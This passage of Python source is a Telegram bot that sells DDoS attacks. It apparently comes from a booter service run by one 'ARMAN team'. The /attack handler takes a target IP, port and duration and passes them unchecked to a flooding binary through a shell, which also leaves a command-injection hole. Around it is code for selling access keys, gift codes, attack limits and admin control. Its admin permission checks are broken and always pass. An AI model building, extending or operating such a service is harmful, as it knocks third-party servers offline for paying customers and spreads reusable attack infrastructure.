                    "𝗢𝗼𝗽𝘀! 𝗜𝘁 𝘀𝗲𝗲𝗺𝘀 𝗹𝗶𝗸𝗲 𝘆𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗲 /attack 𝗰𝗼𝗺𝗺𝗮𝗻𝗱. "
                    "𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗿𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱 𝘁𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗽𝗲𝗿𝘀𝗼𝗻𝗻𝗲𝗹 𝗼𝗻𝗹𝘆 🛡️\n\n"
                    "𝗧𝗼 𝗴𝗮𝗶𝗻 𝗮𝗰𝗰𝗲𝘀𝘀, 𝗽𝗹𝗲𝗮𝘀𝗲 𝗰𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻 𝗔𝗱𝗺𝗶𝗻 𝗼𝗿 𝘁𝗵𝗲 𝗢𝘄𝗻𝗲𝗿"
                    "𝗬𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗿𝗲𝘃𝗶𝗲𝘄𝗲𝗱, 𝗮𝗻𝗱 𝗶𝗳 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱, 𝘆𝗼𝘂 𝘄𝗶𝗹𝗹 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝘁𝗵𝗲 𝗻𝗲𝗰𝗲𝘀𝘀𝗮𝗿𝘆 𝗽𝗲𝗿𝗺𝗶𝘀𝘀𝗶𝗼𝗻𝘀 📩\n\n"
                    "𝗜𝗻 𝘁𝗵𝗲 𝗺𝗲𝗮𝗻𝘁𝗶𝗺𝗲, 𝗵𝗲𝗿𝗲 𝗮𝗿𝗲 𝘀𝗼𝗺𝗲 𝗵𝗲𝗹𝗽𝗳𝘂𝗹 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝘆𝗼𝘂 𝗰𝗮𝗻 𝘁𝗿𝘆 :\n"
                    "1️⃣ /start - 𝐓𝐎 𝐆𝐄𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 𝐋𝐈𝐒𝐓\n"
                    "2️⃣ /contact - 𝐓𝐎 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑\n"
                    "3️⃣ /myinfo - 𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐘𝐎𝐔𝐑 𝐈𝐍𝐅𝐎\n\n"
                    "𝑻𝒉𝒂𝒏𝒌 𝒚𝒐𝒖 𝒇𝒐𝒓 𝒚𝒐𝒖𝒓 𝒖𝒏𝒅𝒆𝒓𝒔𝒕𝒂𝒏𝒅𝒊𝒏𝒈 🙏")
    else:
        command = message.text.split()
        
        # Logic to set time to 120 seconds if not provided
        if len(command) == 3 or (not message.text.startswith('/') and len(command) == 2):
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            
            target = command[1]
            port = int(command[2])
            time = 120  # Default attack time to 120 seconds
            
            # Check if the user has reached the maximum number of attacks
            if user_id in running_attacks and len(running_attacks[user_id]) >= effective_limit:
                response = "🚫 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗶𝗺𝗶𝘁 𝗥𝗲𝗮𝗰𝗵𝗲𝗱! 𝗬𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝗺𝗼𝗿𝗲 𝘁𝗵𝗮𝗻 𝟭𝟬 𝘁𝗶𝗺𝗲𝘀\n\nDM TO BUY :- @MR_ARMAN_OWNER"
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                
                if user_id not in running_attacks:
                    running_attacks[user_id] = []

                running_attacks[user_id].append((target, port, time))
                
                start_attack_reply(message, target, port, time)
                full_command = f"./JUPITER {target} {port} {time}"
                subprocess.run(full_command, shell=True)

                # Count the user's attacks
                attack_count = len(running_attacks[user_id])
                response = (f"🛡️ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉𝙄𝙏𝙄𝘼𝙏𝙀𝘿 🛡️\n"
                            f"𝗧𝗔𝗥𝗚𝗘𝗧 :- [ {target} ]\n"
                            f"𝗣𝗢𝗥𝗧 [ {port} ]\n"
                            f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘 [ {time} ] 𝗦𝗘𝗖𝗢𝗡𝗗𝗦\n\n"
                            f"𝗬𝗢𝗨 𝗥 𝗔𝗧𝗧𝗔𝗖𝗞  {attack_count}/{max_attacks_allowed}")
        else:
            response = "𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n\n𝗨𝗦𝗔𝗚𝗘 :- /𝗮𝘁𝘁𝗮𝗰𝗸 < 𝗜𝗣 > < 𝗣𝗢𝗥𝗧 > < 𝗧𝗜𝗠𝗘 >\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- 👊🤦🙅🔍 𝗠𝗢𝗥𝗘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡:\𝗻- <𝗜𝗣>: 𝗧𝗮𝗿𝗴𝗲𝘁'𝘀 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀\𝗻- <𝗣𝗢𝗥𝗧>: 𝗦𝗽𝗲𝗰𝗶𝗳𝗶𝗰 𝗽𝗼𝗿𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸\𝗻- <𝗧𝗜𝗠𝗘>: 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗼𝗳 𝘁𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\𝗻\𝗻🚨 𝗨𝗦𝗘 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗜𝗕𝗟𝗬 🚨\n\n𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 :- @MR_ARMAN_OWNER"
        
    # Send response to user
    bot.reply_to(message, response)


@bot.message_handler(commands=['set_limit'])
def set_limit(message):
    user_id = str(message.chat.id)
    parts = message.text.split()

    if len(parts) == 2:
        try:
            new_limit = int(parts[1])
            if new_limit > user_attack_limits:
                user_limits[user_id] = new_limit
                response = f"✅ Your attack limit has been increased to {new_limit}!"
            else:
                response = "🚫 You can only increase your limit above the default value!" 
        except ValueError:
            response = "⚠️ Please enter a valid number for the new limit."

    else:
        response = "Usage: /set_limit <new_limit> (must be greater than current limit)"

    bot.reply_to(message, response)

@bot.message_handler(commands=['check'])
def check_ports(message):
    response = """\
𝟏𝟕𝟓𝟎𝟎
𝟐𝟎𝟎𝟎𝟏
𝟐𝟎𝟎𝟎𝟐
𝟐𝟎𝟎𝟎𝟑
𝟒𝟒𝟑

𝐘𝐄 𝐒𝐀𝐁 𝐖𝐑𝐎𝐍𝐆 𝐏𝐎𝐑𝐓 𝐇𝐀𝐈 😂
"""
    bot.send_message(message.chat.id, response)

# message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 ᙎᙓᒪᙅOᙏᙓ TO Tᕼᙓ ᗩᖇᙏᗩᑎ Tᙓᗩᙏ ᗪᗪOS ᙖOT 🌟\n\n"
        f"🕒 ȻᵾɌɌɆNŦ ŦƗMɆ : {get_current_time()} ⏲️\n\n"
        
        "👑 AƊMIƝS ƇOMMAƝƊS 👑\n"
        "👤 /approveuser - <ιd> <dᥙrᥲtιon> - Aρρrovᥱ ᥲ ᥙsᥱr for ᥲ ᥴᥱrtᥲιn dᥙrᥲtιon (dᥲყ, ᥕᥱᥱk, month) (ONLY ADMINS) ✅\n"
        "❌ /removeuser - <𝐢𝐝> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚 𝐮𝐬𝐞𝐫 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐛𝐨𝐭'𝐬 𝐚𝐜𝐜𝐞𝐬𝐬 🚫 \n"
        "🔑 /addadmin - <𝐢𝐝> <𝐛𝐚𝐥𝐚𝐧𝐜𝐞> - 𝐀𝐝𝐝 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧𝐢𝐬𝐭𝐫𝐚𝐭𝐨𝐫 𝐰𝐢𝐭𝐡 𝐚 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐛𝐚𝐥𝐚𝐧𝐜𝐞 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐜𝐡𝐨𝐢𝐜𝐞 💰\n"
        "🚫 /removeadmin - <𝐢𝐝> - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐟𝐫𝐨𝐦 𝐭𝐡𝐞 𝐥𝐢𝐬𝐭 ❌ \n\n"
        "💸 /setkeyprice - <𝐝𝐚𝐲/𝐰𝐞𝐞𝐤/𝐦𝐨𝐧𝐭𝐡> <𝐩𝐫𝐢𝐜𝐞> - 𝐒𝐞𝐭 𝐩𝐫𝐢𝐜𝐞𝐬 𝐟𝐨𝐫 𝐚𝐜𝐜𝐞𝐬𝐬 𝐤𝐞𝐲𝐬 𝐛𝐚𝐬𝐞𝐝 𝐨𝐧 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (Owner only) 💵\n"
        "🎁 /creategift - <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> - 𝐂𝐫𝐞𝐚𝐭𝐞 𝐚 𝐠𝐢𝐟𝐭 𝐜𝐨𝐝𝐞 𝐟𝐨𝐫 𝐚 𝐬𝐩𝐞𝐜𝐢𝐟𝐢𝐞𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 (Admin only) 🎉\n\n"
        
        "👥 USERS COMMANDS 👥\n"
        "💰 /checkbalance - 𝑪𝒉𝒆𝒄𝒌 𝒚𝒐𝒖𝒓 𝒃𝒂𝒍𝒂𝒏𝒄𝒆 𝒂𝒏𝒅 𝒔𝒆𝒆 𝒉𝒐𝒘 𝒎𝒂𝒏𝒚 𝒓𝒆𝒔𝒐𝒖𝒓𝒄𝒆𝒔 𝒚𝒐𝒖 𝒉𝒂𝒗𝒆 📊\n"
        "💥 /attack - < 𝙄𝙋 > < 𝙋𝙊𝙍𝙏 > < 𝙏𝙄𝙈𝙀 > 𝙏𝙊 𝙎𝙄𝙈𝙐𝙇𝘼𝙏𝙀 𝘼 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 (use responsibly! ⚠️)\n"
        "🛑 /stop - 𝐓𝐎 𝐒𝐓𝐎𝐏 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 ⏹️\n"
        "🎁 /redeem - <𝐜𝐨𝐝𝐞> - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐠𝐢𝐟𝐭 𝐜𝐨𝐝𝐞 𝐲𝐨𝐮'𝐯𝐞 𝐫𝐞𝐜𝐞𝐢𝐯𝐞𝐝 🎊\n\n"
        
        "🤖 𝗢𝘂𝗿 𝗯𝗼𝘁 𝗶𝘀 𝗵𝗲𝗿𝗲 𝘁𝗼 𝗮𝘀𝘀𝗶𝘀𝘁 𝘆𝗼𝘂, 𝗯𝘂𝘁 𝗽𝗹𝗲𝗮𝘀𝗲 𝘂𝘀𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝘆 𝗮𝗻𝗱 𝗲𝘁𝗵𝗶𝗰𝗮𝗹𝗹𝘆. 🛡️\n"
        "🚀 𝗦𝘁𝗮𝗿𝘁 𝘂𝘀𝗶𝗻𝗴 🙋‍♂️✨"
    )

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝗣𝗹𝗲𝗮𝘀𝗲 𝗙𝗼𝗹𝗹𝗼𝘄 𝗧𝗵𝗲𝘀𝗲 𝗥𝘂𝗹𝗲𝘀 ⚠️:

𝟭. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝗧𝗼𝗼 𝗠𝗮𝗻𝘆 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 !! 𝗖𝗮𝘂𝘀𝗲 𝗔 𝗕𝗮𝗻 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁
𝟮. 𝗗𝗼𝗻𝘁 𝗥𝘂𝗻 𝟮 𝗔𝘁𝘁𝗮𝗰𝗸𝘀 𝗔𝘁 𝗦𝗮𝗺𝗲 𝗧𝗶𝗺𝗲 𝗕𝗲𝗰𝘇 𝗜𝗳 𝗨 𝗧𝗵𝗲𝗻 𝗨 𝗚𝗼𝘁 𝗕𝗮𝗻𝗻𝗲𝗱 𝗙𝗿𝗼𝗺 𝗕𝗼𝘁.
𝟰. 𝗪𝗲 𝗗𝗮𝗶𝗹𝘆 𝗖𝗵𝗲𝗰𝗸𝘀 𝗧𝗵𝗲 𝗟𝗼𝗴𝘀 𝗦𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝘁𝗵𝗲𝘀𝗲 𝗿𝘂𝗹𝗲𝘀 𝘁𝗼 𝗮𝘃𝗼𝗶𝗱 𝗕𝗮𝗻!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Owner and Admin Can Run This Command 😡."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 𝗔𝗥𝗠𝗔𝗡 𝗧𝗘𝗔𝗠\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This # Function to handle the main menu"


# Start the bot
bot.polling()

